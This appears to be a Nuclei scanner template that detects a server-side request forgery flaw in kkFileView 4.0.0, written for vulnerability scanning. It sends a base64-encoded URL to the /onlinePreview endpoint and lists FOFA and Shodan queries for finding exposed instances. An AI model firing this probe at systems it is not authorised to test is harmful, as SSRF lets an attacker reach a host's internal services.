http:
- matchers:
  - part: body
    type: word
    words:
    - <title>Example Domain</title>
  method: GET
  path:
  - '{{BaseURL}}/onlinePreview?url={{base64(https://example.com)}}'
id: kkFileView-ssrf
info:
  author: Arm!tage
  description: 'kkFileView 4.0.0 is susceptible to server-side request forgery

    '
  metadata:
    fofa-query: app="kkFileView"
    max-request: 1
    shodan-query: http.html:"kkFileView"
    verified: true
  name: kkFileView 4.0.0 - Server-Side Request Forgery
  reference:
  - https://github.com/kekingcn/kkFileView/issues/296
  severity: high
  tags: ssrf,kkFileview
